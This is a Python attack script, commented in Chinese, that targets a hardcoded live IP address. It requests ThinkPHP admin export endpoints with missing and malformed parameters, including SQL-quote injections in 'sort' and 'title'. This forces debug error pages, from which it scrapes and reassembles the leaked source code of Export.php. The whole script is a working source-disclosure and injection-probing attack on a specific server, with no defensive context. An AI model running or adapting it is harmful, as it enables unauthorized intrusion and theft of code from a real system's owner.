#!/usr/bin/env python3
"""tp_src_leak.py - 通过调试错误页滚动泄露Export.php全部源码"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=10, context=ctx)
        return r.status, r.read(250000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(250000).decode("utf-8", "ignore")
    except Exception as e:
        return 0, repr(e)[:150]

def post(url, data):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
            headers={**UA, "Content-Type": "application/x-www-form-urlencoded"}), timeout=10, context=ctx)
        return r.status, r.read(250000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(250000).decode("utf-8", "ignore")
    except Exception as e:
        return 0, repr(e)[:150]

def leak_lines(b):
    """从错误页提取泄露的源码行"""
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        ln = int(m.group(1))
        code = re.sub(r'<[^>]+>', '', m.group(2))
        lines[ln] = code
    return lines

# 收集所有源码行
all_lines = {}
print("=== 收集Export.php源码 ===", flush=True)

# 1. goodslist不带num (line 204-222窗口)
st, b = get(BASE + "/admin/export/goodslist.html")
all_lines.update(leak_lines(b))
print("  [1] goodslist no-arg: %d lines" % len(leak_lines(b)), flush=True)

# 2. goodslist带num (Query错误, 窗口前移)
st, b = get(BASE + "/admin/export/goodslist.html?num=10&page=1")
all_lines.update(leak_lines(b))
print("  [2] goodslist num=10: %d lines" % len(leak_lines(b)), flush=True)

# 3. 其他Export方法触发不同窗口
for m in ["index", "list", "export", "order", "user", "product", "all", "data", "excel", "csv"]:
    st, b = get(BASE + "/admin/export/%s.html" % m)
    l = leak_lines(b)
    if l:
        all_lines.update(l)
        print("  [%s] %s: %d lines" % ("3", m, len(l)), flush=True)
    st, b = get(BASE + "/admin/export/%s.html?num=5" % m)
    l = leak_lines(b)
    if l:
        all_lines.update(l)

# 4. 尝试让数据库查询执行(SQL报错泄露更多)
st, b = get(BASE + "/admin/export/goodslist.html?num=5&page=1&sort=1%27")
all_lines.update(leak_lines(b))
st, b = get(BASE + "/admin/export/goodslist.html?num=5&page=1&title=1%27")
all_lines.update(leak_lines(b))

print("\n=== 泄露的源码(按行排序) ===", flush=True)
for ln in sorted(all_lines):
    print("  %4d: %s" % (ln, all_lines[ln][:130]), flush=True)
print("=== DONE (%d lines) ===" % len(all_lines), flush=True)
